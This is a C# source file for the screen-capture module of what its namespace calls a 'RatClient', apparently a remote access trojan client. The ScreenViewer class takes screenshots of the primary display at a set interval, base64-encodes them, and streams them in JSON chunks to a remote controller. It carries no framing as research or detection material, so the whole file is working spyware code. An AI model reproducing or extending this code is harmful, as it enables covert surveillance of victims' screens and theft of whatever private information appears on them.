using System;
using System.Collections.Generic;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Windows.Forms;
using System.Text;
using System.Threading.Tasks;

namespace RatClient.Features
{
    public class ScreenViewer
    {
        #region Variables
        private System.Timers.Timer screenshotTimer;
        private Queue<string> screenshotChunks = new Queue<string>();
        private bool isSendingScreenshot = false;
        private int bufferSize;
        private Action<object> sendJson;
        #endregion

        #region Methods
        public ScreenViewer(int bufferSize, Action<object> sendJson)
        {
            this.bufferSize = bufferSize;
            this.sendJson = sendJson;
        }

        public void SetIntervalAndStartSendingScreenshots(int interval)
        {
            if (interval <= 0)
            {
                if (screenshotTimer != null)
                {
                    screenshotTimer.Stop();
                    screenshotTimer.Dispose();
                    screenshotTimer = null;
                }
                return;
            }
            screenshotTimer = new System.Timers.Timer(interval);
            screenshotTimer.Elapsed += (sender, e) => SendScreenshot();
            screenshotTimer.Start();
        }

        public void StopSendingScreenshots()
        {
            if (screenshotTimer != null)
            {
                screenshotTimer.Stop();
                screenshotTimer.Dispose();
                screenshotTimer = null;
                sendJson(new { type = "message", text = "Stopped sending screenshots." });
            }
        }

        private void SendScreenshot()
        {
            if (isSendingScreenshot)
                return;

            isSendingScreenshot = true;
            screenshotChunks.Clear();

            var screenshot = CaptureScreen();
            string base64Screenshot = Convert.ToBase64String(screenshot);
            int chunkSize = CalculateMaxChunkSize();

            for (int i = 0; i < base64Screenshot.Length; i += chunkSize)
            {
                string chunk = base64Screenshot.Substring(i, Math.Min(chunkSize, base64Screenshot.Length - i));
                screenshotChunks.Enqueue(chunk);
            }
            SendNextScreenshotChunk();
        }

        private int CalculateMaxChunkSize()
        {
            var sampleMessage = new { type = "screenshot_chunk", data = "", final = false };
            string emptyJson = new System.Web.Script.Serialization.JavaScriptSerializer().Serialize(sampleMessage);
            int jsonOverhead = Encoding.UTF8.GetByteCount(emptyJson);
            int maxDataSize = bufferSize - jsonOverhead; // Buffer limit minus JSON overhead
            return maxDataSize * 3 / 4; // Base64 encodes 3 bytes into 4 characters, hence multiply by 3/4
        }

        private void SendNextScreenshotChunk()
        {
            if (screenshotChunks.Count > 0)
            {
                string chunk = screenshotChunks.Dequeue();
                bool isFinal = screenshotChunks.Count == 0;
                var screenshotMessage = new { type = "screenshot_chunk", data = chunk, final = isFinal };
                sendJson(screenshotMessage);

                if (!isFinal)
                {
                    Task.Delay(10).ContinueWith(t => SendNextScreenshotChunk());
                }
                else
                {
                    isSendingScreenshot = false;
                }
            }
        }

        private byte[] CaptureScreen()
        {
            Bitmap bitmap = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
            Graphics graphics = Graphics.FromImage(bitmap);
            graphics.CopyFromScreen(Screen.PrimaryScreen.Bounds.X, Screen.PrimaryScreen.Bounds.Y, 0, 0, bitmap.Size);
            using (MemoryStream memoryStream = new MemoryStream())
            {
                bitmap.Save(memoryStream, ImageFormat.Jpeg);
                return memoryStream.ToArray();
            }
        }
        #endregion
    }
}